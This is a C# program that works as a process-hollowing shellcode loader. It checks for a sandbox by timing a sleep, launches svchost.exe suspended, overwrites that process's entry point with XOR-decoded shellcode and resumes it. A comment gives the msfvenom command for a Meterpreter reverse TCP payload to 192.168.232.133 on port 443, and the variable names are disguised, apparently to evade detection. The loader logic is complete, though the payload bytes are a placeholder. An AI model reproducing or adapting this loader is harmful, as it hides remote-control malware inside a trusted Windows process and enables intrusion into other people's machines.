using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hprocess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            STARTUPINFO dogs = new STARTUPINFO();
            PROCESS_INFORMATION cats = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref dogs, out cats);

            PROCESS_BASIC_INFORMATION llamas = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr possums = cats.hProcess;
            ZwQueryInformationProcess(possums, 0, ref llamas, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)llamas.PebAddress + 0x10);

            byte[] horses = new byte[IntPtr.Size];
            IntPtr lions = IntPtr.Zero;
            ReadProcessMemory(possums, ptrToImageBase, horses, horses.Length, out lions);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(horses, 0));

            byte[] ducks = new byte[0x200];
            ReadProcessMemory(possums, svchostBase, ducks, ducks.Length, out lions);

            uint donkeys = BitConverter.ToUInt32(ducks, 0x3C);

            uint lepards = donkeys + 0x28;

            uint wolves = BitConverter.ToUInt32(ducks, (int)lepards);

            IntPtr addressOfEntryPoint = (IntPtr)(wolves + (UInt64)svchostBase);
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key 2
            byte[] lizards = new byte[665] {INSERT ENCRYPTED PAYLOAD HERE};

            for(int i = 0; i < lizards.Length; i++)
            {
                lizards[i] = (byte)(((uint)lizards[i] ^ 0x32) & 0xFF);
            }
            WriteProcessMemory(possums, addressOfEntryPoint, lizards, lizards.Length, out lions);

            ResumeThread(cats.hThread);
        }
    }
}
